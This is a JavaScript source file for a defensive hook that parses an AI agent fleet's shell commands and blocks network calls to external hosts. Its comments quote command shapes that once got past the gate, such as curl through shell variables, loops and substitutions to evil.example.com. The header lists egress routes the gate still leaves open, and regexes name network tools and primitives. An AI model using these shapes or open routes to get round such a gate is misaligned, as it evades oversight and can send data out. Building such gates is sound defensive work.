#!/usr/bin/env node
// PreToolUse hook (Bash): blocks the NAMED egress shapes the command-name deny list lets through.
// EGRESSPARSER923, owner GO for scope (a) only (2026-09-23).
//
// The deny list (agent-scaffold.ts, BASH_EGRESS_DENY) matches COMMAND NAMES with globs and has no
// negation, so it cannot say "any http EXCEPT localhost". Its own comment names what passes:
// plain-http external fetches, interpreter one-liners (python3 -c, node -e), and a URL hidden in a
// shell variable. This hook closes exactly those three shapes by PARSING the command:
//   1. curl to an EXTERNAL destination: a scheme-bearing URL (http:// included, which the deny list
//      cannot cover), and any positional / --url / proxy argument even WITHOUT a scheme;
//   2. an interpreter one-liner (python/node/perl/ruby/php/deno/bun with -c/-e/-r/--eval) whose code
//      carries an EXTERNAL URL;
//   3. either of the above when the URL sits in a variable ASSIGNED IN THE SAME COMMAND -- also when
//      the curl / one-liner runs inside a $(...) or backtick substitution of that command: an inner
//      command sees the outer command's assignments and loop values (Viktor 5196, decfb196; before,
//      `for u in <url>; do echo "$(curl -s $u)"; done` and `u=<url>; x=$(curl -s $u)` passed).
//      Fail-closed reserve: a curl whose destination is still a variable after that expansion is
//      denied when the command carries an external URL literal anywhere. A ( ... ) subshell and a
//      <( ... ) / >( ... ) process substitution are inner commands the same way; past the nesting
//      limit (4) an external URL literal in the command is a deny (subst-too-deep).
//   4. any of the above inside a shell's -c <string> (`bash -c 'curl ...'`, `timeout 5 sh -c ...`),
//      read like a substitution (55b51e54; see shellCStrings).
// localhost / 127.0.0.1 / [::1] ALWAYS pass: the dashboard's own calls (memory, kanban, message
// queue, approvals) go over http://localhost and a gate that cut them would silence the fleet.
// Hosts are cut with a regex, not URL(), so http://localhost:$PORT stays local, while
// localhost.evil.com and localhost@evil.com are external.
//
// PRIVATE NETWORK (maintainer decision on #1611, 2026-09-27): agents may reach private network
// targets from the shell. Local, besides the loopback names above, is decided by the LITERAL host
// string only, never by DNS: a canonical dotted-quad IPv4 in 10/8, 172.16/12, 192.168/16 or 127/8, a
// bracketed IPv6 in fc00::/7 (ULA) or fe80::/10 (link-local), or a name whose LAST label is `local`
// (mDNS, e.g. nas.local). A public name that happens to resolve to a private address stays external
// (nas.example.com), and so does every IPv4 spelling a resolver reads differently from how it looks
// (0x0a.0.0.1, 012.0.0.1, 167772161, 10.1) -- fail closed. 169.254/16 is deliberately NOT local:
// it carries the cloud instance-metadata endpoint. 100.64/10 (CGNAT) is not RFC 1918 and stays
// external. A single-label name (nas, xlocal) is external too: the resolver may complete it through
// a search domain to anywhere.
//
// HOW IT READS THE COMMAND (card fae0712e): the shell STRUCTURE comes from the shared lexer,
// scripts/lib/shell-lex.mjs -- where a quote, a # comment, a heredoc body, a substitution and a command
// boundary are. A `curl` or `;` inside a quoted argument, an escaped `\;`, a comment or a quoted heredoc
// body is not a command; a $( ), backtick, ( ), <( ) or >( ) body is a command of its own, judged with
// this command's assignments and loop values (also one in an unquoted heredoc body, where the shell runs
// it). The gate's own rules (curl argv, URL hosts, interpreters, wrappers, pins) read the lexer's words
// and segments. A URL in a comment is not in the command: it is no destination and no "external literal".
//
// WHAT THIS DOES NOT CLOSE -- said here so nobody reads "merged" as "closed" (owner/Marveen 29047):
// the name-and-shape list will never be complete. Still open after (a): network calls INSIDE a script
// file (`bash x.sh`, `python3 x.py` -- the hook sees only the outer command); a program passed as
// `-c "$(cat <<PY ...)"`; a URL whose host is not literally in the command (read from a
// file, the environment, a previous command, a curl -K config, or computed by a substitution such as
// `curl $(echo https://x)`); every other network-capable binary (git, pip, npm, ssh, scp, rsync, dig ...);
// in a stdin-fed program: a `$VAR` in an unquoted heredoc is not expanded, a host given without a scheme
// (`socket.create_connection(("host", 80))`) is not a URL literal, and only the span right before a `|`
// is read (`printf ... | tr ... | python3 -` passes) (Viktor 28582, LOW).
// Closing those is direction (b): an allowlist / network-level gate, not this hook.
//
// Fail-open on an internal error (logged): a crashed gate must not silence the fleet; that is today's
// behaviour, not a new hole. Text the lexer does not fully understand (its `problems`: an unterminated
// quote, heredoc or substitution, a heredoc inside a substitution) is still judged on what the lexer read,
// and a deny found there stands; only when nothing denies is it an allow ("unparseable"), as before. No
// rule LOOSENS because of a problem (the gh-pr.mjs pin refuses it). Every DENY is appended to the block log.
// A command longer than MAX_COMMAND_CHARS (65 536) is not read in full: a cheap, strict reading of its raw text decides
// (a network tool alone denies there; see cheapVerdict). This bounds the text the full reading sees; it does not prove
// every shape under the cap fast (the measured ones are in the HIGH 6 test).
import { readFileSync, appendFileSync, realpathSync, mkdirSync, lstatSync } from 'node:fs'
import { createHash } from 'node:crypto'
import { fileURLToPath } from 'node:url'
import { dirname, join } from 'node:path'
import { lex, words as lexWords } from '../lib/shell-lex.mjs'

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..')
export const BLOCK_LOG = process.env.BASH_EGRESS_BLOCK_LOG || join(ROOT, 'store', 'bash-egress-blocks.jsonl')
// EGRESSVENDOR925: vendor-API hosts a Bash call may reach (owner decision, per install).
// store/egress-vendor-hosts.json = { "hosts": ["api.elevenlabs.io"] }. EXACT host match only:
// no wildcard, no suffix match, no subdomain inheritance -- `elevenlabs.io.evil.com` and
// `x.api.elevenlabs.io` are other hosts. A missing or unreadable file, or an entry that is not
// a plain DNS name, means no exception: today's behaviour (deny). This is NOT
// store/egress-allowlist.json -- that one is the WebFetch / quarantine-reader list.
export const VENDOR_HOSTS_PATH = process.env.BASH_EGRESS_VENDOR_HOSTS || join(ROOT, 'store', 'egress-vendor-hosts.json')
// A plain DNS name: labels of [a-z0-9-], no leading/trailing hyphen, at least one dot, a letter TLD.
// Not an IP, not localhost, no `*`, no leading dot, no port, no userinfo.
const VENDOR_HOST = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}$/
export function parseVendorHosts(raw) {
  const list = raw && typeof raw === 'object' && Array.isArray(raw.hosts) ? raw.hosts : []
  return new Set(list.filter((h) => typeof h === 'string' && VENDOR_HOST.test(h)))
}
export function loadVendorHosts(path = VENDOR_HOSTS_PATH) {
  try { return parseVendorHosts(JSON.parse(readFileSync(path, 'utf-8'))) } catch { return new Set() }
}
// OPTIONAL, opt-in (#1611, a policy proposal): the same file may also carry
// `"domains": ["example.com"]` -- a listed domain OR any subdomain of it passes. The match is on a
// LABEL boundary: `api.example.com` matches `example.com`, while `evilexample.com`,
// `example.com.evil.net` and `example.com@evil.net` (whose host is evil.net) do not. Entries are
// shape-checked exactly like "hosts" (a plain DNS name: no wildcard, no leading dot, no IP, no
// port, no userinfo), so an IP or `*.x` can never widen the list. A missing key, a malformed
// file, or an entry that is not a plain DNS name adds nothing: today's behaviour. Kept separate
// from "hosts" on purpose, so an existing exact entry never silently becomes a suffix rule.
export function parseVendorDomains(raw) {
  const list = raw && typeof raw === 'object' && Array.isArray(raw.domains) ? raw.domains : []
  return new Set(list.filter((h) => typeof h === 'string' && VENDOR_HOST.test(h)))
}
export function loadVendorDomains(path = VENDOR_HOSTS_PATH) {
  try { return parseVendorDomains(JSON.parse(readFileSync(path, 'utf-8'))) } catch { return new Set() }
}
export function hostInDomains(host, domains) {
  for (const d of domains) if (host === d || host.endsWith(`.${d}`)) return true
  return false
}
// GHPRPIN (card 54bd5c28, Viktor 30388 P1-P4): scripts/gh-pr.mjs is the fleet's one Bash path to the GitHub
// API. A node (or bun / deno) command that names it passes only in the EXACT shape
//   node <ROOT>/scripts/gh-pr.mjs <args>
// as the whole command: no `VAR=` before it (NODE_OPTIONS=--require would preload code next to the token),
// no wrapper, no node option before the script, no `;` `&&` `|` or `$(...)` anywhere in the command (a write
// to the file in the same command would land after the hash below was taken), not inside `bash -c` or a
// substitution; the path absolute, not a symlink, resolving to <ROOT>/scripts/gh-pr.mjs; and the file's
// sha256 equal to the pin in store/egress-script-pins.json ({ "scripts/gh-pr.mjs": "<64 hex>" }).
// FAIL-CLOSED for this path (P2): a missing or malformed pin file, an unreadable script, any error = deny,
// although the gate as a whole fails open. A redirect (`> out.json`, `--body-file - <<'EOF'`) is allowed.
// This is DRIFT CONTROL, not enforcement: a copy under another name runs unchecked (open point (a) above),
// and a write between this check and node's read is not closed (TOCTOU, P3). The pin is an owner step after
// Viktor's review of the exact sha (P4).
export const GH_PR_SCRIPT = join(ROOT, 'scripts', 'gh-pr.mjs')
const SCRIPT_PIN_KEY = 'scripts/gh-pr.mjs'
const NODE_RUNTIME = /^(?:node(?:js)?|bun|deno)$/
export function loadScriptPin(path = process.env.BASH_EGRESS_SCRIPT_PINS || join(ROOT, 'store', 'egress-script-pins.json')) {
  const pin = JSON.parse(readFileSync(path, 'utf-8'))?.[SCRIPT_PIN_KEY]
  if (typeof pin !== 'string' || !/^[0-9a-f]{64}$/.test(pin)) throw new Error('no valid pin')
  return pin
}
// The verdict for a node span naming gh-pr.mjs: null = the exact pinned shape, else a deny reason.
function ghPrPinVerdict(sw, alone) {
  try {
    if (!alone || commandWordAt(sw) !== 0) return 'gh-pr-pin-shape'
    const script = sw[1] ?? ''
    if (!script.startsWith('/') || /(?:^|\/)\.\.?(?:\/|$)/.test(script)) return 'gh-pr-pin-path'
    if (lstatSync(script).isSymbolicLink() || realpathSync(script) !== realpathSync(GH_PR_SCRIPT)) return 'gh-pr-pin-path'
    let pin
    try { pin = loadScriptPin() } catch { return 'gh-pr-pin-missing' }
    return createHash('sha256').update(readFileSync(script)).digest('hex') === pin ? null : 'gh-pr-pin-hash'
  } catch {
    return 'gh-pr-pin-error'
  }
}
const LOCAL_HOSTS = new Set(['localhost', '127.0.0.1', '[::1]', '::1'])
// One-liner URL schemes: every network scheme libcurl speaks (minus file:, and ipfs:/ipns:, which
// resolve through a gateway, not the literal host). A one-liner reaches all of them through a curl
// binding (PHP curl_exec, pycurl) or a stream wrapper (PHP ftps://, Perl LWP gopher://), so an
// http/ftp-only list let `php -r '...curl_init("sftp://host/")...curl_exec(...)'` out untouched.
const URL_RE = /\b(?:https?|ftps?|sftp|scp|tftp|smbs?|dict|gophers?|imaps?|pop3s?|smtps?|ldaps?|telnet|mqtt|rtsp):\/\/[^\s'"`<>\\)]+/gi
const INTERPRETER = /^(?:python(?:\d+(?:\.\d+)?)?|node(?:js)?|perl|ruby|php|deno|bun)$/
// the unparseable-external reserve (Klodel 42889): a network tool or an interpreter named anywhere in a raw text
const NET_TOOL_RAW = /(?<![\w.-])(?:curl|wget|nc|ncat)(?![\w-])/
const INTERPRETER_RAW = /(?<![\w.-])(?:python(?:\d+(?:\.\d+)?)?|node(?:js)?|perl|ruby|php|deno|bun)(?![\w-])/
const CODE_FLAG = new Set(['-c', '-e', '-E', '-r', '--eval', '-p', '--print', 'eval'])
// Words that can stand before the real command word of a sub-command. The shell keywords are here
// because `for p in a b; do curl ...` splits at `;` into a span that starts with `do`, and without
// them a curl inside a loop or an if/then body was never looked at. `if` / `while` / `until` /
// `coproc` open a command too: `if curl <url>; then` passed (Viktor M1, decfb196); `coproc NAME {`
// is stepped over by the function-head rule in commandWordAt().
const PREFIX_WORDS = new Set(['env', 'sudo', 'command', 'exec', 'time', 'nohup', 'nice',
  'do', 'then', 'else', 'elif', 'if', 'while', 'until', 'coproc', '{', '(', '!'])
// Wrapper commands that run the rest of their argv as a command, with the options whose VALUE is the next
// word (card 74d46cd0, Viktor 28582 LOW). Before this only the bare word was stepped over, so
// `/usr/bin/env curl <url>`, `env -i curl`, `sudo -u x curl`, `nice -n 5 curl`, `command -p curl`,
// `exec -a x curl`, `time -p curl`, `env -- curl`, and the carriers below (`timeout 10 curl`, `xargs curl`,
// `caffeinate -i curl`, `stdbuf -o0 curl`, `arch -arm64 curl`, `watch curl`) all passed. A path counts (`/usr/bin/env`).
// A short-option cluster whose LAST letter takes a value takes the next word (`sudo -Eu x`). `timeout`
// also takes a positional DURATION before the command. `env -S <line>` runs <line> as a command line:
// shellCStrings() judges it like `bash -c`. Fail-closed direction: a wrongly skipped word only lets a later
// word be judged as the command.
const WRAPPERS = new Map([
  ['env', new Set(['-u', '-C', '-P', '-S', '--unset', '--chdir', '--split-string'])],
  ['sudo', new Set(['-u', '-g', '-h', '-p', '-C', '-U', '-r', '-t', '-D', '-R', '-T', '--user', '--group', '--host',
    '--prompt', '--close-from', '--other-user', '--role', '--type', '--chdir', '--chroot', '--command-timeout'])],
  ['nice', new Set(['-n', '--adjustment'])],
  ['exec', new Set(['-a'])],
  ['time', new Set(['-f', '-o', '--format', '--output'])],
  ['command', new Set()],
  ['nohup', new Set()],
  ['builtin', new Set()],
  ['timeout', new Set(['-s', '-k', '--signal', '--kill-after'])],
  ['xargs', new Set(['-I', '-J', '-L', '-n', '-P', '-R', '-S', '-s', '-E', '-d', '-a', '--max-args', '--max-procs',
    '--max-lines', '--delimiter', '--arg-file', '--eof', '--replace'])],
  ['caffeinate', new Set(['-t', '-w'])],
  ['stdbuf', new Set(['-i', '-o', '-e', '--input', '--output', '--error'])],
  ['arch', new Set(['-arch'])],
  ['watch', new Set(['-n', '--interval'])],
])
// Index just past a wrapper's options (and timeout's DURATION), starting at the word after the wrapper.
function skipWrapperOptions(mw, i, name) {
  const withValue = WRAPPERS.get(name)
  while (i < mw.length) {
    const w = mw[i]
    if (w === '--') { i++; break } // then timeout's DURATION still follows (`timeout -- 10 curl`, Viktor 30051)
    if (w === '-' && name === 'env') { i++; continue } // `env -` = `env -i`
    if (!w.startsWith('-') || w.length < 2) break
    if (w.includes('=')) { i++; continue } // --user=x, --signal=KILL
    const last = /^-[A-Za-z]+$/.test(w) ? `-${w.slice(-1)}` : w
    i += withValue.has(w) || withValue.has(last) ? 2 : 1
  }
  // DURATION: 10, 1.5, 5s, 2m, .5, +5, inf (GNU timeout reads it as a float; Viktor 30051)
  if (name === 'timeout' && i < mw.length && /^(?:[+.]?\d|inf)/i.test(mw[i])) i++
  return i
}
// A one-liner is a DOWNLOADER only when its code uses a network primitive of the language itself.
// Measured on 7 days of fleet commands: a one-liner that merely CARRIES a URL as data (an
// inter-agent message built with subprocess + curl to localhost) must not be denied -- that was 4 of
// 10 would-be blocks. Browser automation (chromium / playwright / puppeteer) is deliberately NOT in
// this list: it is the fleet's mandated browser-verify path on its own domains, and an own-domain
// allowlist is direction (b). Stated as open, measured, and left to the owner.
// The left edge is an identifier edge in Unicode, not JS's ASCII \b (card 4393e82b): \b sees an accented letter
// as a non-word character, so the Hungarian "visszafogottságot (" matched `got\s*\(` and a heredoc that only
// WROTE caption text with a marabel.hu link was denied (Mágnes, 2026-11-04 22:11; 3d3307dd replay, case 5).
// Python and JS identifiers may hold any letter, so a primitive glued to a letter of any script is not that
// primitive: `lógot(` is not `got(`. Everything a \b used to accept (a dot, a bracket, a space, `$`) still does.
const NET_PRIMITIVE = /(?<![\p{L}\p{N}_])(?:urllib|requests\.|http\.client|httplib|httpx|aiohttp|urlopen|socket\.|fetch\s*\(|https?\.(?:get|request)\s*\(|axios|node-fetch|undici|got\s*\(|LWP::|HTTP::Tiny|Net::HTTP|open-uri|IO::Socket|file_get_contents|curl_exec|Invoke-WebRequest)|-M(?:LWP|HTTP::Tiny|IO::Socket|Net::HTTP)/u

export function hostOf(url) {
  const m = /^[a-z][a-z0-9+.-]*:\/\/(?:[^@/?#]*@)?(\[[^\]]*\]|[^/:?#]*)/i.exec(url)
  return m ? m[1].toLowerCase() : null
}
// Canonical dotted-quad only: no leading zero, no hex/octal/decimal/short forms.
const OCTET = '(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)'
const CANON_IPV4 = new RegExp(`^${OCTET}(?:\\.${OCTET}){3}$`)
const MDNS_NAME = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+local$/
// A private-network target by its literal spelling (see the PRIVATE NETWORK note in the header).
export function isPrivateTarget(host) {
  const h = String(host ?? '').toLowerCase()
  if (CANON_IPV4.test(h)) {
    const [a, b] = h.split('.').map(Number)
    return a === 10 || a === 127 || (a === 172 && b >= 16 && b <= 31) || (a === 192 && b === 168)
  }
  const v6 = /^\[([0-9a-f:.]+)\]$/.exec(h)
  if (v6) return /^f[cd][0-9a-f]{0,2}:/.test(v6[1]) || /^fe[89ab][0-9a-f]?:/.test(v6[1])
  return MDNS_NAME.test(h)
}
export function isLocalHost(host) { return LOCAL_HOSTS.has(host) || isPrivateTarget(host) }
export function isExternal(url) {
  const h = hostOf(url)
  if (h === null || h === '') return false
  return !isLocalHost(h)
}
// The simple commands come from the lexer's segments (card fae0712e): a `;` `&&` `||` `|` `|&`, a newline
// and a lone `&` (background: `true & curl <url>` runs curl as its own command, decfb196) end a command;
// `2>&1`, `>&2`, `<&3`, `&>file` do not; a quoted or escaped separator, a comment and a heredoc body are
// no boundary and no command.
// `NAME=value` words of this command (also after export / local / readonly, and anywhere in a command, as
// the earlier regex read them). The NAME= part must be unquoted code: `echo "a U=x"` assigns nothing.
// The name tables (env, loops) have NO prototype (card f2a0f976, Viktor 43009 LOW 1): on a plain object
// `env['__proto__'] = url` set the prototype instead of a key, so `__proto__=<url>; curl -s $__proto__` read an
// unset variable and passed, while bash expands it like any other name.
// Card c20467d6 (Viktor 43231 LOW): a value is expanded when it is assigned, in text order, as bash does. Before, the
// value was stored as written, and expand() runs one pass, so `V=evil.example.com; U=$V; curl -s $U/p` reached curl as
// `$V/p`: a bare name from the environment, unread, and the call passed while bash sent it to the external host. The
// lookup is this command's earlier assignments over the enclosing env (`outer`). A loop variable of this command is
// left as written from its loop head on (one of an enclosing command, `outerLoops`, from the start): it is set in the
// loop body, so neither its earlier value nor a default word is what the body reads; the loop readings fill it as
// before. An assignment to it after the head is its value again. A value whose
// expansion could grow past its own text by more than MAX_EXPANDED_GROWTH (`A=$B$B`, doubled again and again) is not
// built: it becomes UNREAD_VALUE, an operator form, so in a curl host it is an unresolved destination
// (curlOperatorHost), and the size of what is read stays that of the command text.
const MAX_EXPANDED_GROWTH = 8192
const UNREAD_VALUE = '${EGRESS_GATE_UNREAD_VALUE%}'
const LOOP_HEAD = (ws, k) => ws[k].text === 'for' && !ws[k].quoted && /^[A-Za-z_][A-Za-z0-9_]*$/.test(ws[k + 1]?.text ?? '') &&
  !ws[k + 1].quoted && ws[k + 2]?.text === 'in' && !ws[k + 2].quoted
// Card 1a95f6c5 (Viktor 43355 LOW 2): `NAME+=value` appends, and it was no assignment here (the name had to be followed
// by `=`), so `V=http://; V+=evil.example.com; curl -s $V/p` reached curl as an unread $V and passed. It is read as the
// name's value so far (this command's, else unset: empty, as bash has it) followed by the expanded value.
// `records` (when given) gets every assignment in text order, { name, raw, prefix, value }, for the function reading
// in classifyRead (card 1a95f6c5): a function body runs when it is called, not where it stands.
function collectAssignments(r, outer = null, outerLoops = null, records = null) {
  const env = Object.create(null)
  const loopNames = new Set(outerLoops ? Object.keys(outerLoops) : [])
  // the lookup: own values over the enclosing ones; a loop variable is shadowed as unset from its loop head on (an
  // enclosing one from the start), and an assignment after the head sets it again, in text order
  const scope = Object.create(outer)
  for (const v of loopNames) scope[v] = undefined
  for (const ws of r.segWords) {
    for (const [k, w] of ws.entries()) {
      if (LOOP_HEAD(ws, k)) { loopNames.add(ws[k + 1].text); scope[ws[k + 1].text] = undefined }
      const m = /^[A-Za-z_][A-Za-z0-9_]*\+?=/.exec(w.text)
      if (!m || !/^c+$/.test(r.lxB.cls.slice(w.start, w.start + m[0].length))) continue
      const append = m[0].endsWith('+=')
      const name = m[0].slice(0, append ? -2 : -1)
      const raw = w.text.slice(m[0].length)
      const prefix = append ? (scope[name] ?? '') : ''
      let value = raw
      // A quoted or escaped $ ('$V', \$V, $'\x24V') is a literal, the word text no longer shows which is which: a value
      // with only literal ones keeps its text, as before; one with both kinds (`"$V"'$x'`) is not read (unresolved).
      let literal = 0
      let live = 0
      for (let k = w.start + m[0].length; k < w.end; k++) {
        if (r.blankCp[k] !== '$') continue
        const c = r.lxB.cls[k]
        if (c === 'c' || c === 'd') live++
        else if (!(c === 'a' && r.blankCp[k + 1] === "'" && r.lxB.cls[k + 1] === 'a')) literal++ // not a $'...' opener
      }
      // an upper bound of the expansion: every $NAME gives at most its value (a default word's own names are
      // counted where they stand), and an append keeps the value so far (`A+=$B` again and again grows like `A=$A$B`)
      const isLive = live > 0 && raw.includes('$') // a mixed value (literal && live) is UNREAD_VALUE below
      let bound = raw.length + prefix.length
      if (isLive) for (const x of raw.matchAll(/\$\{?([A-Za-z_][A-Za-z0-9_]*)/g)) bound += scope[x[1]]?.length ?? 0
      if ((literal && live) || bound - raw.length > MAX_EXPANDED_GROWTH) value = UNREAD_VALUE
      else value = prefix + (isLive ? expand(raw, scope, loopNames) : raw)
      env[name] = value
      scope[name] = value
      records?.push({ name, raw, prefix, value, live: isLive })
    }
  }
  return env
}
// `for NAME in w1 w2 ...`: the loop variable takes EACH value in turn.
// NAME=value alone never saw it, so `for u in https://x ...; do curl "$u"; done` reached curl with an
// unread destination and passed, while the same URL as a literal or a plain assignment was denied.
// The keyword is an unquoted word (a quoted "for u in" is not a loop); the values are the words after
// `in`, unquoted, with this command's assignments expanded in them (an unquoted value splits again).
function collectLoops(r, env) {
  const loops = Object.create(null)
  for (const ws of r.segWords) {
    const at = ws.findIndex((_, k) => LOOP_HEAD(ws, k))
    if (at === -1) continue
    const vals = ws.slice(at + 3).flatMap((w) => {
      const v = expand(w.text, env)
      return w.quoted ? [v] : v.split(/\s+/).filter(Boolean)
    })
    // appended in place: copying the list per loop was quadratic when one name loops many times (fae0712e h8)
    const list = (loops[ws[at + 1].text] ??= [])
    for (const v of vals) list.push(v)
  }
  return loops
}
// Card 1a95f6c5 (Viktor 43355 LOW 1): a function body runs when it is CALLED, so the text order the assignments are read
// in is not the order they run in: `fn() { curl -s $U/p; U=$V; }; U=localhost; V=evil.example.com; fn; fn` reads U as
// localhost, and bash's second call sends to the external host. In a command that defines a function, a name assigned
// more than once is read like a loop variable over every value it gets: each value as read in text order, and each
// value read again with all of this command's assignments in place (an assignment in the body may run after them).
// Over-reading is the safe side, and only a command with a function definition pays for it (the readings are bounded
// by MAX_LOOP_VARIANTS like any loop, past it the span fails closed).
const FUNCTION_DEF = /(?:^|[\s;&|(){}])function[ \t]+[A-Za-z_][\w.:-]*|[A-Za-z_][\w.:-]*[ \t]*\([ \t]*\)/
function functionValues(r, records, env) {
  if (!records.length || !FUNCTION_DEF.test(r.codeText)) return []
  const byName = new Map()
  for (const a of records) {
    let vals = byName.get(a.name)
    if (!vals) byName.set(a.name, (vals = new Set()))
    vals.add(pasteBound(a.value, env))
    if (a.live && a.value !== UNREAD_VALUE) {
      let bound = a.raw.length + a.prefix.length
      for (const x of a.raw.matchAll(/\$\{?([A-Za-z_][A-Za-z0-9_]*)/g)) bound += env[x[1]]?.length ?? 0
      vals.add(bound - a.raw.length > MAX_EXPANDED_GROWTH ? UNREAD_VALUE : a.prefix + expand(a.raw, env))
    }
  }
  // a name whose readings are not just its text-order value (several values, or one that reads otherwise in the body)
  return [...byName].filter(([n, s]) => s.size > 1 || !s.has(env[n])).map(([n, s]) => [n, [...s]])
}
// A value pasted into a span for the loop readings (a value naming a loop variable, a function reading) can still hold
// $NAME references (`U=$v$B` keeps $B when B is assigned later), and the readings' final expand reads them: past the
// growth limit the value is pasted as UNREAD_VALUE, as an assignment past it is stored (`A=$v$B$B...` with 25 000
// references to an 8 000-character B would otherwise build 200 million characters).
function pasteBound(v, env) {
  if (typeof v !== 'string' || !v.includes('$')) return v
  let grow = 0
  for (const x of v.matchAll(/\$\{?([A-Za-z_][A-Za-z0-9_]*)/g)) {
    grow += env[x[1]]?.length ?? 0
    if (grow > MAX_EXPANDED_GROWTH) return UNREAD_VALUE
  }
  return v
}
// Every reading of a span a loop can produce: one text per loop value (per combination, for nested
// loops). Past MAX_LOOP_VARIANTS the span is not judged value by value: null, and the caller fails
// closed -- a hand-written URL loop is a few values, never hundreds.
const MAX_LOOP_VARIANTS = 64
// A value goes into the text as ONE word: pasting `'{"a":"b c"}'` raw broke the command's own
// quoting, and its fragments were read as hosts (measured on the fleet's week of commands: a loop
// of JSON bodies posted to localhost with -d "$p" was denied). A URL never holds whitespace or a
// quote, so such a value is replaced by the first URL inside it, or by a neutral word.
function asWord(value) {
  if (/^[^\s'"`\\]+$/.test(value)) return value
  return (String(value).match(URL_RE) ?? [])[0] ?? 'x'
}
// The definition order of a loops object (its key order), computed once per object.
const LOOP_ORDER = new WeakMap()
function loopOrder(loops) {
  let order = LOOP_ORDER.get(loops)
  if (!order) {
    order = new Map(Object.keys(loops).map((v, k) => [v, k]))
    LOOP_ORDER.set(loops, order)
  }
  return order
}
// Viktor 2026-11-15 (b58374d7, HIGH 6): this was quadratic in the command. A RegExp per loop variable of the whole
// command, per segment (3 000 sequential `for vN in a; do x=$vN; done` took 10 s, past the hook's timeout, which
// allows), and the size check came after the product was built (12 000 `for i in a; ...` loops: `i` holds 12 000
// values, 12 s). Now only the loop variables the text names are looked at, in DEFINITION order as before: a value is
// pasted raw when it is one word, so a value that spells another loop variable (`for a in '$b'`) is replaced again
// when that variable comes later, and the order decides whether it does (test: "loop readings keep the definition order").
// The size check runs before the product.
// Card e94e8bd2 (found measuring c20467d6): a loop variable reached through an assignment. `U=$v` in the loop body keeps
// `$v` as written (the loop variable is shadowed from its head on), and the readings below looked for loop names in the
// span's own text only: `for v in <ext>; do U=$v; curl -s $U/p; done` named U, no loop variable, and the final expand
// left `$v` -- a bare environment name, unread -- so the call passed while bash sent it to the external host. A plain
// $NAME / ${NAME} whose value names a loop variable is now put in first, so the loop readings see the loop name.
// memo: loop order -> env layer -> (name -> its value names one of those loop variables); one frame reuses its
// (env, loops) pair for every span, and the same env layer can meet other loops in an inner frame
const NAMES_LOOP = new WeakMap()
const SIMPLE_REF = /\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)(?![A-Za-z0-9_])/g
function viaLoopValues(text, env, order) {
  if (!order.size || !text.includes('$')) return text
  let byEnv = NAMES_LOOP.get(order)
  if (!byEnv) NAMES_LOOP.set(order, (byEnv = new WeakMap()))
  let memo = byEnv.get(env)
  if (!memo) byEnv.set(env, (memo = new Map()))
  return text.replace(SIMPLE_REF, (all, a, b) => {
    const n = a ?? b
    if (order.has(n)) return all
    let put = memo.get(n) // the text to put in, or null
    if (put === undefined) {
      const v = env[n]
      const hit = typeof v === 'string' && v.includes('$') &&
        [...v.matchAll(/\$\{?([A-Za-z_][A-Za-z0-9_]*)/g)].some((x) => order.has(x[1]))
      put = hit ? pasteBound(v, env) : null
      memo.set(n, put)
    }
    return put ?? all
  })
}
function loopVariants(text, env, loops) {
  const order = loopOrder(loops)
  text = viaLoopValues(text, env, order)
  const named = new Set()
  for (const m of text.matchAll(/\$\{?([A-Za-z_][A-Za-z0-9_]*)/g)) if (order.has(m[1])) named.add(m[1])
  let out = [text]
  for (const v of [...named].sort((a, b) => order.get(a) - order.get(b))) {
    const vals = loops[v]
    // ${v:-word} / ${v-word} / ${v:=word} / ${v=word} take the loop value too (card f2a0f976), see expand
    const re = new RegExp(`\\$\\{${v}\\}|\\$${v}(?![A-Za-z0-9_])|\\$\\{${v}(:?)[-=]([^{}]*)\\}`, 'g')
    if (!re.test(text)) continue
    re.lastIndex = 0
    if (out.length * vals.length > MAX_LOOP_VARIANTS) return null
    // Viktor 43683 LELET 1: a value still holding a `$` reference (`W=$X`, X unseen) may be empty in bash, so whether
    // `:-` / `:=` takes the word is unknown: read as UNREAD_VALUE (in a curl host: unresolved), as expand() leaves the
    // form as written in the plain reading. Pasting the reference text made it non-empty, and the word was never read.
    out = out.flatMap((t) => vals.map((x) => t.replace(re, (all, colon, word) =>
      (colon && x.includes('$') ? UNREAD_VALUE : !(colon && x === '') ? asWord(x) : word)))) // $v / ${v}: colon is undefined
  }
  // In a loop reading the loop variables hold the LOOP value: an assignment of the same name elsewhere in the command
  // must not stand in for it (Viktor 43216 LOW 1: `V=localhost; for V in <ext> ...; curl "${V-${V:-x}}"` read the
  // outer default with V=localhost). Shadowed as unset, a form left over is the word or stays as written.
  const venv = named.size ? Object.assign(Object.create(env), Object.fromEntries([...named].map((v) => [v, undefined]))) : env
  return out.map((t) => expand(t, venv))
}
// $NAME and ${NAME} take the value assigned in this command. The simple defaults are computed too (card f2a0f976,
// Viktor 43009 LOW 2): ${NAME:-word} and ${NAME:=word} are the value when it is set and not empty, else the word;
// ${NAME-word} and ${NAME=word} are the value when it is set, else the word. A name not assigned here reads as the
// word: that is what bash connects to when the variable is unset, and a value from the environment is as unread as a
// bare $NAME from the environment always was (header: "read from the environment"). The word may hold $NAME (expanded
// again); a word with braces in it, and every other operator (${NAME%x}, ${NAME/a/b}, ${NAME:0:9}, ${#NAME},
// ${!NAME}), is left as written: in a curl destination host it is an unresolved destination (curlOperatorHost).
// loopNames (the plain reading only): a loop variable not assigned here is SET in the loop body, so its default form
// is left as written for the loop readings to fill (`for u in <local>; do curl ${u:-x}; done` never reaches x).
const EXPAND_RE = /\$\{([A-Za-z_][A-Za-z0-9_]*)(?:(:?)[-=]([^{}]*))?\}|\$([A-Za-z_][A-Za-z0-9_]*)/g
function expand(text, env, loopNames = null) {
  return text.replace(EXPAND_RE, (all, a, colon, word, b) => {
    if (b !== undefined) return env[b] ?? all
    const v = env[a]
    if (word === undefined) return v ?? all
    if (v === undefined && loopNames?.has(a)) return all
    // Viktor 43216 LOW 2: a value that is itself an unexpanded reference (`U=$V`) may be empty in bash, so whether
    // `:-` / `:=` takes the word is unknown: the form stays as written (in a curl host: unresolved). `-` / `=` take
    // the set value whatever it holds, as before. (A $( ) or backtick value is a frame, blanked before the assignments
    // are collected, so only a `$` reference can be left in a value.)
    if (colon && v !== undefined && v.includes('$')) return all
    return v !== undefined && !(colon && v === '') ? v : expand(word, env)
  })
}
